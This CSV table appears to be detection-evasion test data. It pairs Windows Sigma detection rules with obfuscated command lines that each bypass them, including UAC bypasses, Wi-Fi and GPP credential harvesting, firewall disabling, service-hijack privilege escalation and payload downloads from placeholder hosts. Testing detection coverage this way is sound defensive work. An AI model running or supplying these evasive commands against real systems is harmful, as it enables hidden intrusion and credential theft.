Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1082,proc_creation_win_discovery_via_reg_queries,System Information Discovery via Registry Queries,0022869c-49f7-4ff2-ba03-85ac42ddac58,,"""powershell.exe"" & {Get-ItemPropertyValue -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit""}",TRUE,TRUE,TRUE,
t1055,proc_creation_win_dllhost_no_cli_execution,Dllhost.EXE Execution Anomaly,e7888eb1-13b0-4616-bd99-4bc0c2b054b9,,d l l h o s t . e x e,TRUE,TRUE,TRUE,
t1055,proc_creation_win_dllhost_no_cli_execution,Dllhost.EXE Execution Anomaly,e7888eb1-13b0-4616-bd99-4bc0c2b054b9,,cmd.exe /c dllhost.exe,TRUE,TRUE,TRUE,
t1548.002,proc_creation_win_explorer_nouaccheck,Explorer NOUACCHECK Flag,534f2ef7-e8a2-4433-816d-c91bccde289b,,"schtasks /create /tn ""TestUACBypass"" /tr ""explorer.exe /NOUACCHECK"" /sc once /st 12:00",TRUE,TRUE,TRUE,
t1548.002,proc_creation_win_hktl_empire_powershell_uac_bypass,HackTool - Empire PowerShell UAC Bypass,3268b746-88d8-4cd3-bffc-30077d02c787,,"powershell.exe -NonI -w hidden -c ""$x=$((gp HKCU:\Software\Microsoft\Windows\Update).Update)""",TRUE,TRUE,TRUE,
t1548.002,proc_creation_win_uac_bypass_cmstp,Bypass UAC via CMSTP,e66779cc-383e-4224-a3a4-267eeb585c40,,cmstp.exe /s C:\AtomicRedTeam\atomics\T1218.003\src\T1218.003_uacbypass.inf /au,TRUE,TRUE,TRUE,
t1548.002,proc_creation_win_uac_bypass_cmstp,Bypass UAC via CMSTP,e66779cc-383e-4224-a3a4-267eeb585c40,,cmstp.exe /s C:\AtomicRedTeam\atomics\T1218.003\src\T1218.003.inf,TRUE,TRUE,TRUE,
t1548.002,proc_creation_win_uac_bypass_cmstp,Bypass UAC via CMSTP,e66779cc-383e-4224-a3a4-267eeb585c40,,copy cmstp.exe not_cmstp.exe && not_cmstp.exe /S /AU C:\Users\Public\Downloads\payload.inf,TRUE,TRUE,TRUE,
t1548.002,proc_creation_win_uac_bypass_cmstp,Bypass UAC via CMSTP,e66779cc-383e-4224-a3a4-267eeb585c40,,"cmstp.exe -s ""C:\AtomicRedTeam\atomics\T1218.003\src\T1218.003_uacbypass.inf"" -au",TRUE,TRUE,TRUE,
t1552.006,proc_creation_win_findstr_gpp_passwords,Findstr GPP Passwords,91a2c315-9ee6-4052-a853-6f6a8238f90d,,"findstr /S cpassword ""\\THAIMX\sysvol\*.xml""",TRUE,TRUE,TRUE,
t1552.006,proc_creation_win_findstr_gpp_passwords,Findstr GPP Passwords,91a2c315-9ee6-4052-a853-6f6a8238f90d,,"findstr /S cpassword \\THAIMX\sysvol\*.xml \""""",TRUE,TRUE,TRUE,
t1552.006,proc_creation_win_findstr_gpp_passwords,Findstr GPP Passwords,91a2c315-9ee6-4052-a853-6f6a8238f90d,,findstr /S cpassword \\THAIMX\sysvol\*.xml,TRUE,TRUE,TRUE,
t1552.006,proc_creation_win_findstr_lsass,LSASS Process Reconnaissance Via Findstr.EXE,fe63010f-8823-4864-a96b-a7b4a0f7b929,,cmd.exe /c tasklist | findstr lsass,TRUE,TRUE,TRUE,
t1552.006,proc_creation_win_findstr_lsass,LSASS Process Reconnaissance Via Findstr.EXE,fe63010f-8823-4864-a96b-a7b4a0f7b929,,"cmd.exe /c tasklist | findstr /i ""lsass""",TRUE,TRUE,TRUE,
t1552.006,proc_creation_win_findstr_lsass,LSASS Process Reconnaissance Via Findstr.EXE,fe63010f-8823-4864-a96b-a7b4a0f7b929,,"cmd.exe /c tasklist | findstr /R ""ls[a]ss""",TRUE,TRUE,TRUE,
t1552.006,proc_creation_win_findstr_recon_everyone,Permission Misconfiguration Reconnaissance Via Findstr.EXE,47e4bab7-c626-47dc-967b-255608c9a920,,"icacls ""C:\\Program Files\*"" 2>nul | findstr /c:""Everyone""",TRUE,TRUE,TRUE,
t1552.006,proc_creation_win_findstr_recon_everyone,Permission Misconfiguration Reconnaissance Via Findstr.EXE,47e4bab7-c626-47dc-967b-255608c9a920,,"icacls ""C:\\Program Files\*"" 2>nul | findstr ""EVERYONE""",TRUE,TRUE,TRUE,
t1552.006,proc_creation_win_findstr_recon_everyone,Permission Misconfiguration Reconnaissance Via Findstr.EXE,47e4bab7-c626-47dc-967b-255608c9a920,,"icacls ""C:\\Program Files\*"" 2>nul | findstr ""Everyone"" | findstr ""(M)""",TRUE,TRUE,TRUE,
t1593.003,proc_creation_win_git_susp_clone,Suspicious Git Clone,aef9d1f1-7396-4e92-a927-4567c7a495c1,,git clone https://github.com/user/CVE-2023-4567.git C:/temp/research,TRUE,TRUE,TRUE,
t1593.003,proc_creation_win_git_susp_clone,Suspicious Git Clone,aef9d1f1-7396-4e92-a927-4567c7a495c1,,git clone https://github.com/user/CVE-2023-4567.git C:\temp\research\CVE-2023-4567\,TRUE,TRUE,TRUE,
t1615,proc_creation_win_gpresult_execution,Gpresult Display Group Policy Information,e56d3073-83ff-4021-90fe-c658e0709e72,,gpresult  /z,TRUE,TRUE,TRUE,
t1218.001,proc_creation_win_hh_chm_execution,HH.EXE Execution,68c8acb4-1b60-4890-8e82-3ddf7a6dba84,,"hh.exe -decompile C:\Users\thaim\AppData\Local\Temp ""C:\AtomicRedTeam\atomics\T1218.001\src\T1218.001.chm""",TRUE,TRUE,TRUE,
t1218.001,proc_creation_win_hh_chm_execution,HH.EXE Execution,68c8acb4-1b60-4890-8e82-3ddf7a6dba84,,"hh.exe ""C:\AtomicRedTeam\atomics\T1218.001\src\T1218.001.chm""",TRUE,TRUE,TRUE,
t1218.001,proc_creation_win_office_onenote_embedded_script_execution,OneNote.EXE Execution of Malicious Embedded Scripts,84b1706c-932a-44c4-ae28-892b28a25b94,,"cmd.exe /c ""move script.ps1 s.ps1 && powershell.exe -File s.ps1""",TRUE,TRUE,TRUE,
t1218.001,proc_creation_win_office_onenote_embedded_script_execution,OneNote.EXE Execution of Malicious Embedded Scripts,84b1706c-932a-44c4-ae28-892b28a25b94,,powershell.exe -ExecutionPolicy Bypass -File malicious.ps1,TRUE,TRUE,TRUE,
t1218.001,proc_creation_win_office_onenote_embedded_script_execution,OneNote.EXE Execution of Malicious Embedded Scripts,84b1706c-932a-44c4-ae28-892b28a25b94,,"""C:\Windows\System32\cmd.exe"" /c ""copy powershell.exe %TEMP%\_powershell.exe && start-process ONENOTE.EXE -ArgumentList '/hyperlink C:\path\to\malicious.one' && %TEMP%\_powershell.exe -ExecutionPolicy Bypass -File malicious.ps1""",TRUE,TRUE,TRUE,
t1564.004,proc_creation_win_powershell_run_script_from_ads,Run PowerShell Script from ADS,45a594aa-1fbd-4972-a809-ff5a99dd81b8,,"powershell.exe -Command ""[System.IO.File]::OpenText('file.txt:secret.ps1').ReadToEnd() | IEX""",TRUE,TRUE,TRUE,
t1216.001,proc_creation_win_lolbin_launch_vsdevshell,Launch-VsDevShell.PS1 Proxy Execution,45d3a03d-f441-458c-8883-df101a3bb146,,"powershell.exe -File ""Launch-VsDevShell.ps1"" -VsWherePath 'evil.exe' -VsInstallationPath 'C:\'",TRUE,TRUE,TRUE,
t1216.001,proc_creation_win_lolbin_launch_vsdevshell,Launch-VsDevShell.PS1 Proxy Execution,45d3a03d-f441-458c-8883-df101a3bb146,,"powershell.exe -File ""Launch-VsDevShell.ps1"" -VsWherePath evil.exe -VsInstallationPath C:\",TRUE,TRUE,TRUE,
t1216.001,proc_creation_win_lolbin_launch_vsdevshell,Launch-VsDevShell.PS1 Proxy Execution,45d3a03d-f441-458c-8883-df101a3bb146,,"powershell.exe -File ""Launch-VsDevShell.ps1"" -VsInstallationPath ""C:\"" -VsWherePath ""evil.exe""",TRUE,TRUE,TRUE,
t1216.001,proc_creation_win_lolbin_pubprn,Pubprn.vbs Proxy Execution,1fb76ab8-fa60-4b01-bddd-71e89bf555da,,"cscript.exe //b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct""",TRUE,TRUE,TRUE,
t1216.001,proc_creation_win_lolbin_pubprn,Pubprn.vbs Proxy Execution,1fb76ab8-fa60-4b01-bddd-71e89bf555da,,"cscript pubprn.vbs 127.0.0.1 ""script:https://remote.server/payload.sct""",TRUE,TRUE,TRUE,
t1216,proc_creation_win_powershell_cl_invocation,Potential Process Execution Proxy Via CL_Invocation.ps1,a0459f02-ac51-4c09-b511-b8c9203fc429,,"powershell.exe -ExecutionPolicy Bypass -Command ""Import-Module 'CL_Invocation.ps1'; $method = 'Sync' + 'Invoke'; & $method 'calc.exe' ' '""",TRUE,TRUE,TRUE,
t1216,proc_creation_win_powershell_cl_invocation,Potential Process Execution Proxy Via CL_Invocation.ps1,a0459f02-ac51-4c09-b511-b8c9203fc429,,"powershell.exe -ExecutionPolicy Bypass -Command ""Import-Module 'CL_Invocation.ps1'; $method = 'Sync' + 'Invoke'; & $method calc.exe ' '""",TRUE,TRUE,TRUE,
t1216,proc_creation_win_powershell_cl_invocation,Potential Process Execution Proxy Via CL_Invocation.ps1,a0459f02-ac51-4c09-b511-b8c9203fc429,,"powershell.exe -ExecutionPolicy Bypass -Command ""Import-Module 'CL_Invocation.ps1'; $method = 'SyncInvoke'; & $method 'calc.exe' ' '""",TRUE,TRUE,TRUE,
t1216,proc_creation_win_winrm_awl_bypass,AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl,074e0ded-6ced-4ebd-8b4d-53f55908119d,,"copy cscript.exe moved_cscript.exe && moved_cscript.exe //nologo winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:""pretty""",TRUE,TRUE,TRUE,
t1021.003,proc_creation_win_mmc_mmc20_lateral_movement,MMC20 Lateral Movement,f1f3bf22-deb2-418d-8cce-e1a45e46a5bd,,C:\\WINDOWS\\system32\\mmc.exe -Embedding,TRUE,TRUE,TRUE,
t1021.003,proc_creation_win_mmc_mmc20_lateral_movement,MMC20 Lateral Movement,f1f3bf22-deb2-418d-8cce-e1a45e46a5bd,,"""C:\\WINDOWS\\system32\\mmc.exe"" -Embedding",TRUE,TRUE,TRUE,
t1021.003,proc_creation_win_mmc_mmc20_lateral_movement,MMC20 Lateral Movement,f1f3bf22-deb2-418d-8cce-e1a45e46a5bd,,C:\\WINDOWS\\system32\\mmc.exe  -Embedding,TRUE,TRUE,TRUE,
t1021.003,proc_creation_win_mmc_mmc20_lateral_movement,MMC20 Lateral Movement,f1f3bf22-deb2-418d-8cce-e1a45e46a5bd,,C:\\WINDOWS\system32\mmc.exe -Embedding,TRUE,TRUE,TRUE,
t1218.007,proc_creation_win_msiexec_dll,DllUnregisterServer Function Call Via Msiexec.EXE,84f52741-8834-4a8c-a413-2eb2269aa6c8,,copy msiexec.exe not_msiexec.exe && .\not_msiexec.exe -z payload.dll,TRUE,TRUE,TRUE,
t1218.007,proc_creation_win_msiexec_dll,DllUnregisterServer Function Call Via Msiexec.EXE,84f52741-8834-4a8c-a413-2eb2269aa6c8,,"msiexec.exe /z ""C:\path\to\payload.tmp""",TRUE,TRUE,TRUE,
t1218.007,proc_creation_win_msiexec_embedding,Suspicious MsiExec Embedding Parent,4a2a2c3e-209f-4d01-b513-4155a540b469,,MsiExec.exe -Embedding 12345 /I fake.msi & pwsh -nop -Command Write-Host 'Bypassed',TRUE,TRUE,TRUE,
t1218.007,proc_creation_win_msiexec_embedding,Suspicious MsiExec Embedding Parent,4a2a2c3e-209f-4d01-b513-4155a540b469,,MsiExec.exe -Embedding 12345 /I fake.msi & powershell.exe -Command Write-Host 'Bypassed',TRUE,TRUE,TRUE,
t1218.007,proc_creation_win_msiexec_install_remote,Suspicious Msiexec Quiet Install From Remote Location,8150732a-0c9d-4a99-82b9-9efb9b90c40c,,"c:\windows\system32\msiexec.exe /quiet /i ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi""",TRUE,TRUE,TRUE,
t1218.007,proc_creation_win_msiexec_install_remote,Suspicious Msiexec Quiet Install From Remote Location,8150732a-0c9d-4a99-82b9-9efb9b90c40c,,"c:\windows\system32\msiexec.exe -q -i ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi""",TRUE,TRUE,TRUE,
t1218.007,proc_creation_win_msiexec_install_remote,Suspicious Msiexec Quiet Install From Remote Location,8150732a-0c9d-4a99-82b9-9efb9b90c40c,,"c:\windows\system32\msiexec.exe /q /i""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi""",TRUE,TRUE,TRUE,
t1070.005,proc_creation_win_net_share_unmount,Unmount Share Via Net.EXE,cb7c4a03-2871-43c0-9bbb-18bbdb079896,,"C:\\WINDOWS\system32\net1  share ""\\test\\share"" /delete",TRUE,TRUE,TRUE,
t1070.005,proc_creation_win_net_share_unmount,Unmount Share Via Net.EXE,cb7c4a03-2871-43c0-9bbb-18bbdb079896,,C:\\WINDOWS\system32\net1  share \\test\\share /delete,TRUE,TRUE,TRUE,
t1562.004,proc_creation_win_netsh_fw_add_rule,New Firewall Rule Added Via Netsh.EXE,cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c,,"""C:\WINDOWS\SysWOW64\netsh"" firewall add allowedprogram ""C:\Program Files\uvnc bvba\UltraVNC\vncviewer.exe"" ""vncviewer.exe"" ENABLE ALL",TRUE,TRUE,TRUE,
t1562.004,proc_creation_win_netsh_fw_add_rule,New Firewall Rule Added Via Netsh.EXE,cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c,,"""C:\\WINDOWS\\SysWOW64\\netsh"" firewall add allowedprogram ""C:\\Program Files\\uvnc bvba\\UltraVNC\\winvnc.exe"" ""winvnc.exe"" ENABLE ALL",TRUE,TRUE,TRUE,
t1562.004,proc_creation_win_netsh_fw_delete_rule,Firewall Rule Deleted Via Netsh.EXE,1a5fefe6-734f-452e-a07d-fc1c35bce4b2,,"netsh.exe advfirewall firewall del rule name=""All""",TRUE,TRUE,TRUE,
t1562.004,proc_creation_win_netsh_fw_disable,Firewall Disabled via Netsh.EXE,57c4bf16-227f-4394-8ec7-1b745ee061c3,,netsh advfirewall set allprofiles state o f f,TRUE,TRUE,TRUE,
t1562.004,proc_creation_win_netsh_fw_disable,Firewall Disabled via Netsh.EXE,57c4bf16-227f-4394-8ec7-1b745ee061c3,,netsh advfirewall set allprofiles state o``f``f,TRUE,TRUE,TRUE,
t1546.007,proc_creation_win_netsh_helper_dll_persistence,Potential Persistence Via Netsh Helper DLL,56321594-9087-49d9-bf10-524fe8479452,,"netsh.exe ""a""""d""""d"" ""h""""e""""l""""p""""e""""r"" evil.dll",TRUE,TRUE,TRUE,
t1040,proc_creation_win_netsh_packet_capture,New Network Trace Capture Started Via Netsh.EXE,d3c3861d-c504-4c77-ba55-224ba82d0118,,netsh tr st capture=yes,TRUE,TRUE,TRUE,
t1040,proc_creation_win_netsh_wifi_credential_harvesting,Harvesting Of Wifi Credentials Via Netsh.EXE,42b1a5b8-353f-4f10-b256-39de4467faff,,"cmd.exe /c ""echo wlan s p k name=SSID key=clear | netsh.exe""",TRUE,TRUE,TRUE,
t1040,proc_creation_win_netsh_wifi_credential_harvesting,Harvesting Of Wifi Credentials Via Netsh.EXE,42b1a5b8-353f-4f10-b256-39de4467faff,,"cmd.exe /c ""echo wlan show profile name=SSID key=clear | netsh.exe""",TRUE,TRUE,TRUE,
t1040,proc_creation_win_netsh_wifi_credential_harvesting,Harvesting Of Wifi Credentials Via Netsh.EXE,42b1a5b8-353f-4f10-b256-39de4467faff,,cmd.exe /c echo wlan show profile name=SSID key=clear | netsh.exe,TRUE,TRUE,TRUE,
t1083,proc_creation_win_notepad_local_passwd_discovery,Notepad Password Files Discovery,3b4e950b-a3ea-44d3-877e-432071990709,,notepad.exe C:\Users\admin\Documents\passwords.txt,TRUE,TRUE,TRUE,
t1083,proc_creation_win_notepad_local_passwd_discovery,Notepad Password Files Discovery,3b4e950b-a3ea-44d3-877e-432071990709,,"notepad.exe ""C:\\Data\\passwords.csv""",TRUE,TRUE,TRUE,
t1083,proc_creation_win_notepad_local_passwd_discovery,Notepad Password Files Discovery,3b4e950b-a3ea-44d3-877e-432071990709,,notepad.exe C:\secure\passwords.bak,TRUE,TRUE,TRUE,
t1083,proc_creation_win_notepad_local_passwd_discovery,Notepad Password Files Discovery,3b4e950b-a3ea-44d3-877e-432071990709,,"powershell.exe -Command ""notepad C:\\backup\\passwords.log""",TRUE,TRUE,TRUE,
defense-evasion,proc_creation_win_powershell_set_acl,PowerShell Script Change Permission Via Set-Acl,bdeb2cff-af74-4094-8426-724dc937f20a,,"powershell.exe & { $termsrvDll = 'C:\\Windows\\System32\\termsrv.dll'; $ACL = Get-Acl $termsrvDll; $permission = 'Administrators','FullControl','Allow'; $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission; $ACL.SetAccessRule($accessRule); Set-Acl -Path $termsrvDll -AclObject $ACL }",TRUE,TRUE,TRUE,
t1218.008,proc_creation_win_odbcconf_response_file,Response File Execution Via Odbcconf.EXE,5f03babb-12db-4eec-8c82-7b4cb5580868,,"odbcconf.exe -f""T1218.008.rsp""",TRUE,TRUE,TRUE,
t1566,proc_creation_win_office_onenote_susp_child_processes,Suspicious Microsoft OneNote Child Process,c27515df-97a9-4162-8a60-dc0eeb51b775,,"explorer.exe ""C:\Users\Public\Documents\payload.lnk""",TRUE,TRUE,TRUE,
t1123,proc_creation_win_powershell_audio_capture,Audio Capture via PowerShell,932fb0d8-692b-4b0f-a26e-5643a50fe7d6,,"powershell.exe -Command ""Import-Module AudioDeviceCmdlets; $func = 'Get-AudioDevice'; & $func -List""",TRUE,TRUE,TRUE,
t1027.010,proc_creation_win_powershell_comobject_msi,Obfuscated PowerShell MSI Install via WindowsInstaller COM,7b6a7418-3afc-11f0-aff4-000d3abf478c,,"powershell.exe -w hidden -c ""$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('http://example.com/payload.msi', '')""",TRUE,TRUE,TRUE,
t1027.010,proc_creation_win_rundll32_obfuscated_ordinal_call,Potential Obfuscated Ordinal Call Via Rundll32,43fa5350-db63-4b8f-9a01-789a427074e1,,"rundll32.exe payload.dll, #131096",TRUE,TRUE,TRUE,
t1027.010,proc_creation_win_rundll32_obfuscated_ordinal_call,Potential Obfuscated Ordinal Call Via Rundll32,43fa5350-db63-4b8f-9a01-789a427074e1,,"rundll32.exe payload.dll,#131096+0",TRUE,TRUE,TRUE,
t1027.010,proc_creation_win_rundll32_obfuscated_ordinal_call,Potential Obfuscated Ordinal Call Via Rundll32,43fa5350-db63-4b8f-9a01-789a427074e1,,"rundll32.exe payload.dll,#131096",TRUE,TRUE,TRUE,
t1543.003,proc_creation_win_powershell_create_service,New Service Creation Using PowerShell,c02e96b7-c63a-4c47-bd83-4a9f74afcfb2,,"powershell.exe -Command ""New-Service -Name 'TestService' -bin 'cmd.exe' -StartupType Manual""",TRUE,TRUE,TRUE,
t1543.003,proc_creation_win_powershell_create_service,New Service Creation Using PowerShell,c02e96b7-c63a-4c47-bd83-4a9f74afcfb2,,"powershell.exe -Command ""N`ew-Service -Name 'TestService' -BinaryPathName 'cmd.exe' -StartupType Manual""",TRUE,TRUE,TRUE,
t1543.003,proc_creation_win_sc_service_tamper_for_persistence,Potential Persistence Attempt Via Existing Service Tampering,38879043-7e1e-47a9-8d46-6bec88e201df,,reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\ExampleService /v ImagePath /t REG_EXPAND_SZ /d C:\Windows\Temp\backdoor /f,TRUE,TRUE,TRUE,
t1543.003,proc_creation_win_sc_service_tamper_for_persistence,Potential Persistence Attempt Via Existing Service Tampering,38879043-7e1e-47a9-8d46-6bec88e201df,,sc.exe config ExampleService binPath= calc.exe,TRUE,TRUE,TRUE,
t1562,proc_creation_win_powershell_disable_firewall,Windows Firewall Disabled via PowerShell,12f6b752-042d-483e-bf9c-915a6d06ad75,,powershell.exe -Command Set-NetFirewallProfile -Profile Private -Enabled:0,TRUE,TRUE,TRUE,
t1562,proc_creation_win_powershell_disable_firewall,Windows Firewall Disabled via PowerShell,12f6b752-042d-483e-bf9c-915a6d06ad75,,powershell.exe -Command Set-NetFirewallProfile -Profile Public -Enabled $false,TRUE,TRUE,TRUE,
t1562,proc_creation_win_reg_write_protect_for_storage_disabled,Write Protect For Storage Disabled,75f7a0e2-7154-4c4d-9eae-5cdb4e0a5c13,,cmd.exe /c reg add HKLM\System\CurrentControlSet\Control\StorageDevicePolicies /v WriteProtect /t REG_DWORD /d 0 /f,TRUE,TRUE,TRUE,
t1562,proc_creation_win_reg_write_protect_for_storage_disabled,Write Protect For Storage Disabled,75f7a0e2-7154-4c4d-9eae-5cdb4e0a5c13,,"cmd /c reg add ""HKLM\System\CurrentControlSet\Control\StorageDevicePolicies"" /v WriteProtect /t REG_DWORD /d 0 /f",TRUE,TRUE,TRUE,
t1562,proc_creation_win_reg_write_protect_for_storage_disabled,Write Protect For Storage Disabled,75f7a0e2-7154-4c4d-9eae-5cdb4e0a5c13,,cmd.exe /c reg add HKLM\System\CurrentControlSet\Control\StorageDevicePolicies /v WriteProtect /d 0 /t REG_DWORD /f,TRUE,TRUE,TRUE,
t1552.004,proc_creation_win_susp_private_keys_recon,Private Keys Reconnaissance Via CommandLine Tools,213d6a77-3d55-4ce8-ba74-fcfef741974e,,"powershell.exe -c ""Get-ChildItem -Path C:\ -Recurse -Include *.$('p'+'em')""",TRUE,TRUE,TRUE,
t1115,proc_creation_win_powershell_get_clipboard,PowerShell Get-Clipboard Cmdlet Via CLI,b9aeac14-2ffd-4ad3-b967-1354a4e628c3,,"powershell.exe -Command ""Get-Clip`board""",TRUE,TRUE,TRUE,
t1115,proc_creation_win_powershell_get_clipboard,PowerShell Get-Clipboard Cmdlet Via CLI,b9aeac14-2ffd-4ad3-b967-1354a4e628c3,,"powershell.exe -Command ""IEX ('Get-' + 'Clipboard')""",TRUE,TRUE,TRUE,
t1574.011,proc_creation_win_registry_privilege_escalation_via_service_key,Potential Privilege Escalation via Service Permissions Weakness,0f9c21f1-6a73-4b0e-9809-cb562cb8d981,,"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\LegitService"" /v ""ImagePath"" /t REG_EXPAND_SZ /d ""malicious.exe"" /f",TRUE,TRUE,TRUE,
t1574.011,proc_creation_win_registry_privilege_escalation_via_service_key,Potential Privilege Escalation via Service Permissions Weakness,0f9c21f1-6a73-4b0e-9809-cb562cb8d981,,"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\LegitService"" ^/v ""ImagePath"" ^/t REG_EXPAND_SZ ^/d ""malicious.exe"" ^/f",TRUE,TRUE,TRUE,
t1574.011,proc_creation_win_registry_privilege_escalation_via_service_key,Potential Privilege Escalation via Service Permissions Weakness,0f9c21f1-6a73-4b0e-9809-cb562cb8d981,,reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LegitService /v ImagePath /t REG_EXPAND_SZ /d malicious.exe /f,TRUE,TRUE,TRUE,
t1574.011,proc_creation_win_registry_privilege_escalation_via_service_key,Potential Privilege Escalation via Service Permissions Weakness,0f9c21f1-6a73-4b0e-9809-cb562cb8d981,,"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\LegitService"" /v ""Image""+""Path"" /t REG_EXPAND_SZ /d ""malicious.exe"" /f",TRUE,TRUE,TRUE,
t1574.011,proc_creation_win_registry_privilege_escalation_via_service_key,Potential Privilege Escalation via Service Permissions Weakness,0f9c21f1-6a73-4b0e-9809-cb562cb8d981,,"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\LegitService"" /v ImagePath /t REG_EXPAND_SZ /d malicious.exe /f",TRUE,TRUE,TRUE,
t1574.011,proc_creation_win_sc_change_sevice_image_path_by_non_admin,Possible Privilege Escalation via Weak Service Permissions,d937b75f-a665-4480-88a5-2f20e9f9b22a,,"sc.exe  config   ""WeakService""   BINPATH=   ""mal.exe""",TRUE,TRUE,TRUE,
t1574.011,proc_creation_win_sc_change_sevice_image_path_by_non_admin,Possible Privilege Escalation via Weak Service Permissions,d937b75f-a665-4480-88a5-2f20e9f9b22a,,"sc.exe config WeakService binPath= ""mal.exe""",TRUE,TRUE,TRUE,
t1574.011,proc_creation_win_sc_change_sevice_image_path_by_non_admin,Possible Privilege Escalation via Weak Service Permissions,d937b75f-a665-4480-88a5-2f20e9f9b22a,,sc.exe config WeakService BINPATH=mal.exe,TRUE,TRUE,TRUE,
t1574.011,proc_creation_win_sc_change_sevice_image_path_by_non_admin,Possible Privilege Escalation via Weak Service Permissions,d937b75f-a665-4480-88a5-2f20e9f9b22a,,"sc.exe config WeakService ""BINPATH=mal.exe""",TRUE,TRUE,TRUE,
t1074.001,proc_creation_win_powershell_zip_compress,Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet,85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98 # Process Creation,,powershell.exe -NoProfile -WindowStyle Hidden -Command Compress-Archive -Path C:\SensitiveData\* -DestinationPath C:\Users\Public\Documents\archive.zip,TRUE,TRUE,TRUE,
